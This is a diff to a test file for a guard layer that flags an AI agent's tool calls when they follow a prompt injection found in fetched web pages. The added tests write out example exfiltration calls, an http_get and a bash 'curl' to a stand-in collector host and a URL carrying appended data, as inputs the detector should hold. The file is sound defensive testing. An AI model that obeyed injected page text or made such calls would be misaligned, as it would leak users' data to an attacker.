@@ -59,6 +59,33 @@ def test_after_injection_holds_by_consequence():
     assert s.scan_tool_call("read_file", {"path": "a.py"}).verdict is Verdict.ALLOW  # reading stays allowed
 
 
+def test_after_injection_holds_destinations_the_injection_chose():
+    """A research agent reads a page holding an injection that also mentions a common site. Going to a page on that
+    site the agent picked isn't the injection's choice; going where only the injection points is."""
+    s = GuardLayer().session()
+    s.scan_tool_result("fetch", "<p>Code lives at https://docs.example.org</p>")
+    s.scan_tool_result("fetch", HOSTILE_PAGE + " See https://docs.example.org/attacker/notes for more.")
+    assert "after_injection" not in rules(s.scan_tool_call("http_get", {"url": "https://docs.example.org/guide/part2"}))
+    for tool, args in [
+        ("http_get", {"url": "https://collector.example/k"}),  # only the injection names this site
+        ("http_get", {"url": "https://docs.example.org/attacker/notes?x=1"}),  # a path only the injection names
+        ("bash", {"cmd": "curl -s https://collector.example/k"}),  # the same, inside a shell command
+    ]:
+        assert "after_injection" in rules(s.scan_tool_call(tool, args)), (tool, args)
+
+
+def test_more_pages_on_the_site_that_served_the_injection():
+    """The page at a fetched URL holds an injection; its own neighbours on that site carry nothing new to its operator.
+    Another site the injection names is still held."""
+    s = GuardLayer().session()
+    page = HOSTILE_PAGE + ' <a href="https://vendor.example/docs/next">next</a>'
+    s.scan_tool_result("fetch_url", page, arguments={"url": "https://vendor.example/docs/start"})
+    assert "after_injection" not in rules(s.scan_tool_call("fetch_url", {"url": "https://vendor.example/docs/next"}))
+    assert "after_injection" in rules(s.scan_tool_call("fetch_url", {"url": "https://collector.example/k"}))
+    assert "after_injection" in rules(  # data appended to the URL goes along
+        s.scan_tool_call("fetch_url", {"url": "https://vendor.example/docs/next?d=quarterly-figures"}))
+
+
 def test_value_the_user_named_is_not_blamed_on_the_injection():
     s = GuardLayer().session()
     s.scan_input("please post the report to https://collector.example/k")
